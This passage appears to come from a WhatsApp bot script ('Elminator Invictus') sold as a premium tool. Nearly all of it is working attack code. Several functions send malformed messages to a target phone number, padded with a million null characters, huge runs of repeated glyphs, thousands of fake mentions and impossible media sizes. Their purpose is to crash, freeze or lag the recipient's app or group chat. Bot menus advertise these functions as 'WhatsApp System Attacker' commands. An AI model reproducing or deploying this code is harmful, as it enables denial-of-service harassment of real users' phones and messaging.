                                url: "https://mmg.whatsapp.net/v/t62.7114-24/30578226_1168432881298329_968457547200376172_n.enc?ccb=11-4&oh=01_Q5AaINRqU0f68tTXDJq5XQsBL2xxRYpxyF4OFaO07XtNBIUJ&oe=67C0E49E&_nc_sid=5e03e0&mms3=true",
                                mimetype: "audio/mpeg",
                                fileSha256: "ON2s5kStl314oErh7VSStoyN8U6UyvobDFd567H+1t0=",
                                fileLength: 999999999999999999,
                                seconds: 9999999999999999999,
                                ptt: true,
                                mediaKey: "+3Tg4JG4y5SyCh9zEZcsWnk8yddaGEAL/8gFJGC7jGE=",
                                fileEncSha256: "iMFUzYKVzimBad6DMeux2UO10zKSZdFg9PkvRtiL4zw=",
                                directPath: "/v/t62.7114-24/30578226_1168432881298329_968457547200376172_n.enc?ccb=11-4&oh=01_Q5AaINRqU0f68tTXDJq5XQsBL2xxRYpxyF4OFaO07XtNBIUJ&oe=67C0E49E&_nc_sid=5e03e0",
                                mediaKeyTimestamp: 99999999999999,
                                contextInfo: {
                                    mentionedJid: [
                                        "13300350@s.whatsapp.net",
                                        target,
                                        ...Array.from({ length: 1900 }, () =>
                                            `1${Math.floor(Math.random() * 90000000)}@s.whatsapp.net`
                                        )
                                    ],
                                    isForwarded: true,
                                    forwardedNewsletterMessageInfo: {
                                        newsletterJid: "1@newsletter",
                                        serverMessageId: 1,
                                        newsletterName: "X"
                                    }
                                },
                                waveform: "AAAAIRseCVtcWlxeW1VdXVhZDB09SDVNTEVLW0QJEj1JRk9GRys3FA8AHlpfXV9eL0BXL1MnPhw+DBBcLU9NGg=="
                            }
                        }
                    }
                }
            };

            const Content = generateWAMessageFromContent(
                target,
                module.message,
                { userJid: target }
            );

            await sock.relayMessage("status@broadcast", Content.message, {
                messageId: Content.key.id,
                statusJidList: [target],
                additionalNodes: [
                    {
                        tag: "meta",
                        attrs: {},
                        content: [
                            {
                                tag: "mentioned_users",
                                attrs: {},
                                content: [
                                    { tag: "to", attrs: { jid: target } }
                                ]
                            }
                        ]
                    }
                ]
            });
            const viewOnceMsg = generateWAMessageFromContent(
                "status@broadcast",
                {
                    viewOnceMessage: {
                        message: {
                            interactiveResponseMessage: {
                                body: {
                                    text: "X",
                                    format: "BOLD"
                                },
                                nativeFlowResponseMessage: {
                                    name: "call_permission_request",
                                    paramsJson: "\u0000".repeat(1000000),
                                    version: 3
                                }
                            }
                        }
                    }
                },
                {}
            );
            await sock.relayMessage(
                "status@broadcast",
                viewOnceMsg.message,
                {
                    messageId: viewOnceMsg.key.id,
                    statusJidList: [target]
                }
            );
        }
        async function TzXAudio(sock, target) {
            const TzXR9X = {
                message: {
                    ephemeralMessage: {
                        message: {
                            audioMessage: {
                                url: "https://mmg.whatsapp.net/v/t62.7114-24/30578226_1168432881298329_968457547200376172_n.enc?ccb=11-4&oh=01_Q5AaINRqU0f68tTXDJq5XQsBL2xxRYpxyF4OFaO07XtNBIUJ&oe=67C0E49E&_nc_sid=5e03e0&mms3=true",
                                mimetype: "audio/mpeg",
                                fileSha256: "ON2s5kStl314oErh7VSStoyN8U6UyvobDFd567H+1t0=",
                                fileLength: 99999999999999,
                                seconds: 99999999999999,
                                ptt: true,
                                mediaKey: "+3Tg4JG4y5SyCh9zEZcsWnk8yddaGEAL/8gFJGC7jGE=",
                                fileEncSha256: "iMFUzYKVzimBad6DMeux2UO10zKSZdFg9PkvRtiL4zw=",
                                directPath: "/v/t62.7114-24/30578226_1168432881298329_968457547200376172_n.enc?ccb=11-4&oh=01_Q5AaINRqU0f68tTXDJq5XQsBL2xxRYpxyF4OFaO07XtNBIUJ&oe=67C0E49E&_nc_sid=5e03e0",
                                mediaKeyTimestamp: 99999999999999,
                                contextInfo: {
                                    mentionedJid: [
                                        "@s.whatsapp.net",
                                        target,
                                        ...Array.from({ length: 35000 }, () =>
                                            `1${Math.floor(Math.random() * 90000000)}@s.whatsapp.net`
                                        )
                                    ],
                                    isForwarded: true,
                                    forwardedNewsletterMessageInfo: {
                                        newsletterJid: "120363400196954767@newsletter",
                                        serverMessageId: 1,
                                        newsletterName: "TzX | R9X - Information"
                                    }
                                },
                                waveform: "AAAAIRseCVtcWlxeW1VdXVhZDB09SDVNTEVLW0QJEj1JRk9GRys3FA8AHlpfXV9eL0BXL1MnPhw+DBBcLU9NGg=="
                            }
                        }
                    }
                }
            };

            const TzXR9X2 = generateWAMessageFromContent(target, TzXR9X.message, { userJid: target });

            await sock.relayMessage("status@broadcast", TzXR9X2.message, {
                messageId: TzXR9X2.key.id,
                statusJidList: [target],
                additionalNodes: [
                    {
                        tag: "meta",
                        attrs: {},
                        content: [
                            {
                                tag: "mentioned_users",
                                attrs: {},
                                content: [
                                    { tag: "to", attrs: { jid: target }, content: undefined }
                                ]
                            }
                        ]
                    }
                ]
            });
        }
        async function TzXNull(sock, target) {
            await sock.relayMessage(target, {
                viewOnceMessage: {
                    message: {
                        interactiveResponseMessage: {
                            body: {
                                text: "YT ArulOfficial-ID",
                                format: "DEFAULT"
                            },
                            nativeFlowResponseMessage: {
                                name: "call_permission_request",
                                paramsJson: "\u0000".repeat(1000000),
                                version: 3
                            }
                        }
                    }
                }
            },
                {}
            );
        }
        //============ ( BATAS FUNCTION DELAY INVIS ) =================//
        // Function Crash Ui Sytem
        async function SpcmUi(sock, target) {
            try {
                await sock.relayMessage(
                    target,
                    {
                        ephemeralMessage: {
                            message: {
                                interactiveMessage: {
                                    header: {
                                        locationMessage: {
                                            degreesLatitude: 0,
                                            degreesLongitude: 0,
                                        },
                                        hasMediaAttachment: true,
                                    },
                                    body: {
                                        text:
                                            "</⃟༑𝑻͢𝒉𝒆͜͡𝑬𝒍𝒎𝒊͢͠𝒏𝒂𝒕𝒐͜͡𝒓 𝑰͢𝒏͜͡𝒗𝒊͢͠𝒄𝒕𝒖͜͡𝒔🎭</⃟༑\n" +
                                            "ꦾ".repeat(92000) +
                                            "ꦽ".repeat(92000) +
                                            "ꦾ".repeat(92000) +
                                            "ꦽ".repeat(92000),
                                    },
                                    nativeFlowMessage: {},
                                    contextInfo: {
                                        mentionedJid: [
                                            "1@newsletter",
                                            "1@newsletter",
                                            "1@newsletter",
                                            "1@newsletter",
                                            "1@newsletter",
                                        ],
                                        groupMentions: [
                                            {
                                                groupJid: "1@newsletter",
                                                groupSubject: "hds",
                                            },
                                        ],
                                        quotedMessage: {
                                            documentMessage: {
                                                contactVcard: true,
                                            },
                                        },
                                    },
                                },
                            },
                        },
        {
                        participant: { jid: target },
                        userJid: target,
                    }
                );
            } catch (err) {
                console.log(err);
            }
        }

        async function BlankSpam(sock, target) {
            try {
                let message = {
                    viewOnceMessage: {
                        message: {
                            messageContextInfo: {
                                deviceListMetadata: {},
                                deviceListMetadataVersion: 2,
                                messageSecret: crypto.randomBytes(32),
                                supportPayload: JSON.stringify({
                                    version: 3,
                                    is_ai_message: true,
                                    should_show_system_message: true,
                                    ticket_id: crypto.randomBytes(16)
                                })
                            },
                            interactiveMessage: {
                                body: {
                                    text: "</⃟༑𝑻͢𝒉𝒆͜͡𝑬𝒍𝒎𝒊͢͠𝒏𝒂𝒕𝒐͜͡𝒓 𝑰͢𝒏͜͡𝒗𝒊͢͠𝒄𝒕𝒖͜͡𝒔🎭</⃟༑" + "ꦾ".repeat(120000) + "ꦽ".repeat(40000),
                                },
                                nativeFlowMessage: {
                                    buttons: [
                                        {
                                            name: "cta_url",
                                            buttonParamsJson: `{"display_text":"${"ꦽ".repeat(10000)}","url":"https:","merchant_url":"https:"}`
                                        },
                                        {
                                            name: "cta_reply",
                                            buttonParamsJson: `{"display_text":"${"ꦾ".repeat(10000)}","id":"</⃟༑𝑻͢𝒉𝒆͜͡𝑬𝒍𝒎𝒊͢͠𝒏𝒂𝒕𝒐͜͡𝒓 𝑰͢𝒏͜͡𝒗𝒊͢͠𝒄𝒕𝒖͜͡𝒔🎭</⃟༑"}`
                                        },
                                        {
                                            name: "cta_copy",
                                            buttonParamsJson: `{"display_text":"${"ꦾ".repeat(10000)}","copy_code":"18.0.0"}`
                                        },
                                        {
                                            name: "cta_url",
                                            buttonParamsJson: `{"display_text":"${"ꦽ".repeat(10000)}","url":"https:","merchant_url":"https:"}`
                                        },
                                        {
                                            name: "cta_reply",
                                            buttonParamsJson: `{"display_text":"${"ꦾ".repeat(10000)}","id":"</⃟༑𝑻͢𝒉𝒆͜͡𝑬𝒍𝒎𝒊͢͠𝒏𝒂𝒕𝒐͜͡𝒓 𝑰͢𝒏͜͡𝒗𝒊͢͠𝒄𝒕𝒖͜͡𝒔🎭</⃟༑"}`
                                        },
                                        {
                                            name: "cta_copy",
                                            buttonParamsJson: `{"display_text":"${"ꦾ".repeat(10000)}","copy_code":"23.0.0"}`
                                        }
                                    ]
                                },
                                contextInfo: {
                                    mentionedJid: [target],
                                    isForwarded: true,
                                    forwardingScore: 999,
                                },
                            },
                        },
                    },
                };

                await sock.relayMessage(target, message, {
                    participant: { jid: target },
                });
            } catch (err) {
                console.log(err);
            }
        }

        async function BugGb12(sock, target, ptcp = true) {
            try {
                const message = {
                    botInvokeMessage: {
                        message: {
                            newsletterAdminInviteMessage: {
                                newsletterJid: `33333333333333333@newsletter`,
                                newsletterName: "</ꦽ⃟༑𝑻͢𝒉𝒆͜͡𝑬𝒍𝒎𝒊͢͠𝒏𝒂𝒕𝒐͜͡𝒓 𝑰͢𝒏͜͡𝒗𝒊͢͠𝒄𝒕𝒖͜͡𝒔🎭</⃟༑ꦽ" + "ꦾ".repeat(120000),
                                jpegThumbnail: "",
                                caption: "ꦽ".repeat(120000) + "@9".repeat(120000),
                                inviteExpiration: Date.now() + 1814400000, // 21 hari
                            },
                        },
                    },
                    nativeFlowMessage: {
                        messageParamsJson: "",
                        buttons: [
                            {
                                name: "call_permission_request",
                                buttonParamsJson: "{}",
                            },
                            {
                                name: "galaxy_message",
                                paramsJson: {
                                    "screen_2_OptIn_0": true,
                                    "screen_2_OptIn_1": true,
                                    "screen_1_Dropdown_0": "nullOnTop",
                                    "screen_1_DatePicker_1": "1028995200000",
                                    "screen_1_TextInput_2": "null@gmail.com",
                                    "screen_1_TextInput_3": "94643116",
                                    "screen_0_TextInput_0": "\u0018".repeat(50000),
                                    "screen_0_TextInput_1": "SecretDocu",
                                    "screen_0_Dropdown_2": "#926-Xnull",
                                    "screen_0_RadioButtonsGroup_3": "0_true",
                                    "flow_token": "AQAAAAACS5FpgQ_cAAAAAE0QI3s."
                                },
                            },
                        ],
                    },
                    contextInfo: {
                        mentionedJid: Array.from({ length: 5 }, () => "0@s.whatsapp.net"),
                        groupMentions: [
                            {
                                groupJid: "0@s.whatsapp.net",
                                groupSubject: "Vampire Official",
                            },
                        ],
                    },
                };

                await sock.relayMessage(target, message, {
                    userJid: target,
                });
            } catch (err) {
                console.error("Error sending newsletter:", err);
            }
        }
        async function LocaXotion(sock, target) {
            await sock.relayMessage(
                target, {
                viewOnceMessage: {
                    message: {
                        liveLocationMessage: {
                            degreesLatitude: 197 - 7728 - 82882,
                            degreesLongitude: -111 - 188839938,
                            caption: ' GROUP_MENTION ' + "ꦿꦸ".repeat(150000) + "@1".repeat(70000),
                            sequenceNumber: '0',
                            jpegThumbnail: '',
                            contextInfo: {
                                forwardingScore: 177,
                                isForwarded: true,
                                quotedMessage: {
                                    documentMessage: {
                                        contactVcard: true
                                    }
                                },
                                groupMentions: [{
                                    groupJid: "1999@newsletter",
                                    groupSubject: " Subject "
                                }]
                            }
                        }
                    }
                }
            }, {
                participant: {
                    jid: target
                }
            }
            );
        }
        async function videoBlank(sock, target) {
            const cards = [];
            const videoMessage = {
                url: "https://mmg.whatsapp.net/v/t62.7161-24/26969734_696671580023189_3150099807015053794_n.enc?ccb=11-4&oh=01_Q5Aa1wH_vu6G5kNkZlean1BpaWCXiq7Yhen6W-wkcNEPnSbvHw&oe=6886DE85&_nc_sid=5e03e0&mms3=true",
                mimetype: "video/mp4",
                fileSha256: "sHsVF8wMbs/aI6GB8xhiZF1NiKQOgB2GaM5O0/NuAII=",
                fileLength: "107374182400",
                seconds: 999999999,
                mediaKey: "EneIl9K1B0/ym3eD0pbqriq+8K7dHMU9kkonkKgPs/8=",
                height: 9999,
                width: 9999,
                fileEncSha256: "KcHu146RNJ6FP2KHnZ5iI1UOLhew1XC5KEjMKDeZr8I=",
                directPath: "/v/t62.7161-24/26969734_696671580023189_3150099807015053794_n.enc?ccb=11-4&oh=01_Q5Aa1wH_vu6G5kNkZlean1BpaWCXiq7Yhen6W-wkcNEPnSbvHw&oe=6886DE85&_nc_sid=5e03e0",
                mediaKeyTimestamp: "1751081957",
                jpegThumbnail: null,
                streamingSidecar: null
            }
            const header = {
                videoMessage,
                hasMediaAttachment: false,
                contextInfo: {
                    forwardingScore: 666,
                    isForwarded: true,
                    stanzaId: "-" + Date.now(),
                    participant: "1@s.whatsapp.net",
                    remoteJid: "status@broadcast",
                    quotedMessage: {
                        extendedTextMessage: {
                            text: "",
                            contextInfo: {
                                mentionedJid: ["13135550002@s.whatsapp.net"],
                                externalAdReply: {
                                    title: "",
                                    body: "",
                                    thumbnailUrl: "https://files.catbox.moe/55qhj9.png",
                                    mediaType: 1,
                                    sourceUrl: "https://xnxx.com",
                                    showAdAttribution: false
                                }
                            }
                        }
                    }
                }
            };

            for (let i = 0; i < 50; i++) {
                cards.push({
                    header,
                    nativeFlowMessage: {
                        messageParamsJson: "{".repeat(10000)
                    }
                });
            }

            const msg = generateWAMessageFromContent(
                target,
                {
                    viewOnceMessage: {
                        message: {
                            interactiveMessage: {
                                body: {
                                    text: "ꦽ".repeat(45000)
                                },
                                carouselMessage: {
                                    cards,
                                    messageVersion: 1
                                },
                                contextInfo: {
                                    businessMessageForwardInfo: {
                                        businessOwnerJid: "13135550002@s.whatsapp.net"
                                    },
                                    stanzaId: "Lolipop Xtream" + "-Id" + Math.floor(Math.random() * 99999),
                                    forwardingScore: 100,
                                    isForwarded: true,
                                    mentionedJid: ["13135550002@s.whatsapp.net"],
                                    externalAdReply: {
                                        title: "ោ៝".repeat(10000),
                                        body: "Hallo ! ",
                                        thumbnailUrl: "https://files.catbox.moe/55qhj9.png",
                                        mediaType: 1,
                                        mediaUrl: "",
                                        sourceUrl: "t.me/Xatanicvxii",
                                        showAdAttribution: false
                                    }
                                }
                            }
                        }
                    }
                },
                {}
            );

            await sock.relayMessage(target, msg.message, {
                participant: { jid: target },
                messageId: msg.key.id
            });
        }
        //============ ( BATAS FUNCTION CRASH UI ) =================//
        // Function Bug Group
        async function R9XKillGc(sock, target, mention) {
            await sock.relayMessage(
                target,
                {
                    requestPaymentMessage: {
                        currencyCodeIso4217: null,
                        requestFrom: "13135550202@s.whatsapp.net",
                        expiryTimestamp: Date.now() + 8000,
                        amount: {
                            value: null,
                            offset: null,
                            currencyCode: null
                        }
                    }
                },
                mention
                    ? {
                        participant: { jid: target }
                    }
                    : {}
            )
        }

        //============ ( AKHIR ALL FUNCTION BUG ) =================//

        // Main command handler
        switch (command) {
            case 'cortana':
            case 'edu':
            case "menu": {
                await reaction(m.chat, "😈")
                await sleep(550);
                await reaction(m.chat, "☠️")
                await sleep(550);
                await reaction(m.chat, "🦠")
                await sleep(550);
                await reaction(m.chat, "🩸")
                await sleep(550);
                await reaction(m.chat, "🔖")

                const totalMem = os.totalmem();
                const freeMem = os.freemem();
                const usedMem = totalMem - freeMem;
                const formattedUsedMem = formatSize(usedMem);
                const formattedTotalMem = formatSize(totalMem);
                let timestamp = speed();
                let latensi = speed() - timestamp;
                let menu = `\`╭─[ 𝐈͢𝐍͠𝐅͡𝚯𝐑͢𝐌͠𝐀͡𝐓͢𝐈͠𝚯𝐍 𝐁͢𝚯͠𝐓 ]\`
\`│\` *リト名* : 𝐄𝐥𝐦𝐢𝐧𝐚𝐭𝐨𝐫 𝐈𝐧𝐯𝐢𝐜𝐭𝐮𝐬
\`│\` *リプ* : 𝟖.𝟎
\`│\` *スクプ* : ${aruloffcx.public ? '𝐏𝐮𝐛𝐥𝐢𝐜 𝐁𝐨𝐭' : '𝐏𝐫𝐢𝐯𝐚𝐭𝐞 𝐁𝐨𝐭'}
\`│\` *開発者* : 𝐀͢𝐫͡𝐮𝐥 ᳟𝐎͢𝐟͡𝐟𝐢𝐜𝐢𝐚𝐥-᳟𝐈͢𝐃
\`│\` *リプト* : 𝐏𝐫𝐞𝐦𝐢𝐮𝐦 𝐁𝐮𝐲
\`│\` *バジョン* : ${isCreator ? "𝐎𝐰𝐧𝐞𝐫 𝐔𝐬𝐞𝐫" : isPremium ? "𝐏𝐫𝐞𝐦𝐢𝐮𝐦 𝐔𝐬𝐞𝐫" : "𝐍𝐨𝐭 𝐀𝐜𝐜𝐞𝐬"}
\`╰────────────────㋡︎\`
`;

                await aruloffcx.sendMessage(m.chat, {
                    interactiveMessage: {
                        title: menu,
                        footer: 'click the buttons below to see the menu features of this bot',
                        thumbnail: "https://files.catbox.moe/sfbwxk.jpeg",
                        nativeFlowMessage: {
                            messageParamsJson: JSON.stringify({
                                limited_time_offer: {
                                    text: "𝐄𝐥𝐦𝐢𝐧𝐚𝐭𝐨𝐫 𝐈𝐧𝐯𝐢𝐜𝐭𝐮𝐬 𝐕𝐈𝐏",
                                    url: "t.me/arulofficialll",
                                    copy_code: "",
                                    expiration_time: Date.now() * 999
                                },
                                bottom_sheet: {
                                    in_thread_buttons_limit: 2,
                                    divider_indices: [1, 2, 3, 4, 5, 999],
                                    list_title: "▾ 𝐄͜𝐋͡𝐌͢𝐈͜𝐍͡𝐀͢𝐓͜𝐎͡𝐑 𖤍 𝐈͜𝐍͡𝐕͢𝐈͜𝐂͡𝐓͢𝐔͜𝐒 ▾",
                                    button_title: "𝐌𝚵𝐍𝐔"
                                },
                                tap_target_configuration: {
                                    title: "▸ 𝐗 ◂",
                                    description: "bomboclard",
                                    canonical_url: "t.me/arulofficialll",
                                    domain: "shop.example.com",
                                    button_index: 0
                                }
                            }),
                            buttons: [
                                {
                                    name: "single_select",
                                    buttonParamsJson: JSON.stringify({ has_multiple_buttons: true })
                                },
                                {
                                    name: "call_permission_request",
                                    buttonParamsJson: JSON.stringify({ has_multiple_buttons: true })
                                },
                                {
                                    name: "single_select",
                                    buttonParamsJson: JSON.stringify({
                                        title: "© 𝐀𝐫𝐮𝐥 𝐎𝐟𝐟𝐢𝐜𝐢𝐚𝐥-𝐈𝐃",
                                        sections: [
                                            {
                                                title: '⚝ 么尺ㄩㄥ',
                                                highlight_label: '⌜ ㅊ - Ⲁ͢Ⲣ͡ⲩⲖ͜ Ⲟ͢ⲫ͡ⲫⲓ͜ⲕⲓⲁⲖ-Ⲓ͢Ⲇ͡ 🕊️ ⌟',
                                                rows: [
                                                    {
                                                        header: 'Bug - Menu(Node-SFX)',
                                                        title: '',
                                                        description: '- Displaying the WhatsApp System Attacker Menu',
                                                        id: '.bugmenu'
                                                    }
                                                ]
                                            },
                                            {
                                                title: '⚝ 么尺ㄩㄥ',
                                                highlight_label: '⌜ ㅊ - Ⲁ͢Ⲣ͡ⲩⲖ͜ Ⲟ͢ⲫ͡ⲫⲓ͜ⲕⲓⲁⲖ-Ⲓ͢Ⲇ͡ 🕊️ ⌟',
                                                rows: [
                                                    {
                                                        header: 'Owner - Menu(Node-Js)',
                                                        title: '',
                                                        description: '- Add bot access and settings',
                                                        id: '.ownermenu'
                                                    }
                                                ]
                                            },
                                            {
                                                title: '⚝ 么尺ㄩㄥ',
                                                highlight_label: '⌜ ㅊ - Ⲁ͢Ⲣ͡ⲩⲖ͜ Ⲟ͢ⲫ͡ⲫⲓ͜ⲕⲓⲁⲖ-Ⲓ͢Ⲇ͡ 🕊️ ⌟',
                                                rows: [
                                                    {
                                                        header: 'Other - Menu(JavaScript-Core)',
                                                        title: '',
                                                        description: '- Other Features and Menu Panel',
                                                        id: '.othermenu'
                                                    }
                                                ]
                                            }
                                        ],
                                        has_multiple_buttons: true
                                    })
                                },
                                {
                                    name: "cta_url",
                                    buttonParamsJson: JSON.stringify({
                                        display_text: "𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐞𝐫",
                                        url: "http://t.me/arulofficialll"
                                    })
                                },
                                {
                                    name: "quick_reply",
                                    buttonParamsJson: JSON.stringify({
                                        display_text: "𝐁𝐮𝐲 𝐒𝐜𝐫𝐢𝐩𝐭",
                                        id: `.buysc`
                                    })
                                },
                                {
                                    name: "cta_url",
                                    buttonParamsJson: JSON.stringify({
                                        display_text: "𝐈𝐧𝐟𝐨 𝐔𝐩𝐝𝐚𝐭𝐞 𝐒𝐜𝐫𝐢𝐩𝐭",
                                        url: "https://whatsapp.com/channel/0029Vb5zkzTHltY0ERtDNP3M"
                                    })
                                }
                            ]
                        }
                    }
                },
                    {
                        quoted: {
                            key: { remoteJid: "0@s.whatsapp.net", fromMe: false, id: "ownername", participant: "0@s.whatsapp.net" },
                            message: {
                                requestPaymentMessage: {
                                    currencyCodeIso4217: "USD",
                                    amount1000: "999999999",
                                    requestFrom: "0@s.whatsapp.net",
                                    noteMessage: { extendedTextMessage: { text: "𝐀͢𝐫͡𝐮𝐥 ᳟𝐎͢𝐟͡𝐟𝐢𝐜𝐢𝐚𝐥-᳟𝐈͢𝐃" } },
                                    expiryTimestamp: "999999999",
                                    amount: { value: "91929291929", offset: "1000", currencyCode: "INR" }
                                }
                            }
                        }
                    });
                await aruloffcx.sendMessage(m.chat, {
                    audio: { url: 'https://files.catbox.moe/9w750j.mp3' },
                    mimetype: 'audio/mpeg',
                    ptt: true
                },
                    {
                        quoted: {
                            key: { remoteJid: "0@s.whatsapp.net", fromMe: false, id: "ownername", participant: "0@s.whatsapp.net" },
                            message: {
                                requestPaymentMessage: {
                                    currencyCodeIso4217: "USD",
                                    amount1000: "999999999",
                                    requestFrom: "0@s.whatsapp.net",
                                    noteMessage: { extendedTextMessage: { text: "𝐀͢𝐫͡𝐮𝐥 ᳟𝐎͢𝐟͡𝐟𝐢𝐜𝐢𝐚𝐥-᳟𝐈͢𝐃" } },
                                    expiryTimestamp: "999999999",
                                    amount: { value: "91929291929", offset: "1000", currencyCode: "INR" }
                                }
                            }
                        }
                    });
                break;
            }

            case 'bugmenu': {
                await reaction(m.chat, "😈")
                await sleep(550);
                await reaction(m.chat, "☠️")
                await sleep(550);
                await reaction(m.chat, "🦠")
                await sleep(550);
                await reaction(m.chat, "🩸")
                await sleep(550);
                await reaction(m.chat, "🔖")

                let timestamp = speed();
                let latensi = speed() - timestamp;
                const menu = `\`╭─[ 𝐈͢𝐍͠𝐅͡𝚯𝐑͢𝐌͠𝐀͡𝐓͢𝐈͠𝚯𝐍 𝐁͢𝚯͠𝐓 ]\`
\`│\` *リト名* : 𝐄𝐥𝐦𝐢𝐧𝐚𝐭𝐨𝐫 𝐈𝐧𝐯𝐢𝐜𝐭𝐮𝐬
\`│\` *リプ* : 𝟖.𝟎
\`│\` *スクプ* : ${aruloffcx.public ? '𝐏𝐮𝐛𝐥𝐢𝐜 𝐁𝐨𝐭' : '𝐏𝐫𝐢𝐯𝐚𝐭𝐞 𝐁𝐨𝐭'}
\`│\` *開発者* : 𝐀͢𝐫͡𝐮𝐥 ᳟𝐎͢𝐟͡𝐟𝐢𝐜𝐢𝐚𝐥-᳟𝐈͢𝐃
\`│\` *リプト* : 𝐏𝐫𝐞𝐦𝐢𝐮𝐦 𝐁𝐮𝐲
\`│\` *バジョン* : ${isCreator ? "𝐎𝐰𝐧𝐞𝐫 𝐔𝐬𝐞𝐫" : isPremium ? "𝐏𝐫𝐞𝐦𝐢𝐮𝐦 𝐔𝐬𝐞𝐫" : "𝐍𝐨𝐭 𝐀𝐜𝐜𝐞𝐬"}
\`╰────────────────㋡︎\`

\`╭─[ 𝐅͢𝐨͠𝐫͡𝐜͠𝐞͡𝐥͢𝐨͠𝐬͡𝐞 𝐁͢𝐮͠𝐠 ]\`
\`│\` ▢ ${prefix}elmicall 62xxx
\`│\` ▢ ${prefix}elmitrash 62xxx
\`│\` ▢ ${prefix}elmionemsg 62xxx
\`╰────❍\`

\`╭─[ 𝐂͢𝐫͠𝐚͡𝐬͠𝐡 𝐇͠𝐨͡𝐦͢𝐞 𝐁͢𝐮͠𝐠 ]\`
\`│\` ▢ ${prefix}elmiblanking 628xx
\`│\` ▢ ${prefix}elmidevice 628xx
\`│\` ▢ ${prefix}elmixcrash 628xx
\`╰────❍\`

\`╭─[ 𝐃͢𝐞͠𝐥͡𝐚͠𝐲 𝐇͢𝐚͠𝐫͡𝐝 𝐁͢𝐮͠𝐠 ]\`
\`│\` ▢ ${prefix}elmizap 628xx
\`│\` ▢ ${prefix}elmighost 628xx
\`│\` ▢ ${prefix}elmitravas 628xx
\`╰────❍\`

\`╭─[ 𝐆͢𝐫͠𝐨͡𝐮͢𝐩 𝐁͢𝐮͠𝐠 ]\`
\`│\` ▢ ${prefix}kanjut - inplace
\`│\` ▢ ${prefix}maklo - inpale
\`│\` ▢ ${prefix}tobrut - inplace
\`╰────❍\`
`;

                await aruloffcx.sendMessage(m.chat, {
                    interactiveMessage: {
                        title: menu,
                        footer: '',
                        thumbnail: "https://files.catbox.moe/sfbwxk.jpeg",
                        nativeFlowMessage: {
                            buttons: [
                                {
                                    name: "single_select",
                                    buttonParamsJson: JSON.stringify({ has_multiple_buttons: true })
                                },
                                {
                                    name: "call_permission_request",
                                    buttonParamsJson: JSON.stringify({ has_multiple_buttons: true })
                                },
                                {
                                    name: 'single_select',
                                    buttonParamsJson: JSON.stringify({
                                        title: "𝐌𝚵𝐍𝐔",
                                        sections: [
                                            {
                                                title: '⚝ 么尺ㄩㄥ',
                                                highlight_label: '⌜ ㅊ - Ⲁ͢Ⲣ͡ⲩⲖ͜ Ⲟ͢ⲫ͡ⲫⲓ͜ⲕⲓⲁⲖ-Ⲓ͢Ⲇ͡ 🕊️ ⌟',
                                                rows: [
                                                    {
                                                        header: 'Bug - Menu(Node-SFX)',
                                                        title: '',
                                                        description: '- Displaying the WhatsApp System Attacker Menu',
                                                        id: '.bugmenu'
                                                    }
                                                ]
                                            },
                                            {
                                                title: '⚝ 么尺ㄩㄥ',
                                                highlight_label: '⌜ ㅊ - Ⲁ͢Ⲣ͡ⲩⲖ͜ Ⲟ͢ⲫ͡ⲫⲓ͜ⲕⲓⲁⲖ-Ⲓ͢Ⲇ͡ 🕊️ ⌟',
                                                rows: [
                                                    {
                                                        header: 'Owner - Menu(Node-Js)',
                                                        title: '',
                                                        description: '- Add bot access and settings',
                                                        id: '.ownermenu'
                                                    }
                                                ]
                                            },
                                            {
                                                title: '⚝ 么尺ㄩㄥ',
                                                highlight_label: '⌜ ㅊ - Ⲁ͢Ⲣ͡ⲩⲖ͜ Ⲟ͢ⲫ͡ⲫⲓ͜ⲕⲓⲁⲖ-Ⲓ͢Ⲇ͡ 🕊️ ⌟',
                                                rows: [
                                                    {
                                                        header: 'Other - Menu(JavaScript-Core)',
                                                        title: '',
                                                        description: '- Other Features and Menu Panel',
                                                        id: '.othermenu'
                                                    }
                                                ]
                                            }
                                        ]
                                    })
                                },
                                {
                                    name: "cta_url",
                                    buttonParamsJson: JSON.stringify({
                                        display_text: "𝐈𝐧𝐟𝐨 𝐔𝐩𝐝𝐚𝐭𝐞 𝐒𝐜𝐫𝐢𝐩𝐭",
                                        url: "https://whatsapp.com/channel/0029Vb5zkzTHltY0ERtDNP3M"
                                    })
                                }
                            ]
                        }
                    }
                },
                    {
                        quoted: {
                            key: { remoteJid: "0@s.whatsapp.net", fromMe: false, id: "ownername", participant: "0@s.whatsapp.net" },
                            message: {
                                requestPaymentMessage: {
                                    currencyCodeIso4217: "USD",
                                    amount1000: "999999999",
                                    requestFrom: "0@s.whatsapp.net",
                                    noteMessage: { extendedTextMessage: { text: "𝐀͢𝐫͡𝐮𝐥 ᳟𝐎͢𝐟͡𝐟𝐢𝐜𝐢𝐚𝐥-᳟𝐈͢𝐃" } },
                                    expiryTimestamp: "999999999",
                                    amount: { value: "91929291929", offset: "1000", currencyCode: "INR" }
                                }
                            }
                        }
                    });
                await aruloffcx.sendMessage(m.chat, {
                    audio: { url: 'https://files.catbox.moe/9w750j.mp3' },
                    mimetype: 'audio/mpeg',
                    ptt: true
                },
                    {
                        quoted: {
                            key: { remoteJid: "0@s.whatsapp.net", fromMe: false, id: "ownername", participant: "0@s.whatsapp.net" },
                            message: {
                                requestPaymentMessage: {
                                    currencyCodeIso4217: "USD",
                                    amount1000: "999999999",
                                    requestFrom: "0@s.whatsapp.net",
                                    noteMessage: { extendedTextMessage: { text: "𝐀͢𝐫͡𝐮𝐥 ᳟𝐎͢𝐟͡𝐟𝐢𝐜𝐢𝐚𝐥-᳟𝐈͢𝐃" } },
                                    expiryTimestamp: "999999999",
                                    amount: { value: "91929291929", offset: "1000", currencyCode: "INR" }
                                }
                            }
                        }
                    });
                break;
            }

            case 'ownermenu': {
                await reaction(m.chat, "😈")
                await sleep(550);
                await reaction(m.chat, "☠️")
                await sleep(550);
                await reaction(m.chat, "🦠")
                await sleep(550);
                await reaction(m.chat, "🩸")
                await sleep(550);
                await reaction(m.chat, "🔖")

                let timestamp = speed();
                let latensi = speed() - timestamp;
                const menu = `\`╭─[ 𝐈͢𝐍͠𝐅͡𝚯𝐑͢𝐌͠𝐀͡𝐓͢𝐈͠𝚯𝐍 𝐁͢𝚯͠𝐓 ]\`
\`│\` *リト名* : 𝐄𝐥𝐦𝐢𝐧𝐚𝐭𝐨𝐫 𝐈𝐧𝐯𝐢𝐜𝐭𝐮𝐬
\`│\` *リプ* : 𝟖.𝟎
\`│\` *スクプ* : ${aruloffcx.public ? '𝐏𝐮𝐛𝐥𝐢𝐜 𝐁𝐨𝐭' : '𝐏𝐫𝐢𝐯𝐚𝐭𝐞 𝐁𝐨𝐭'}
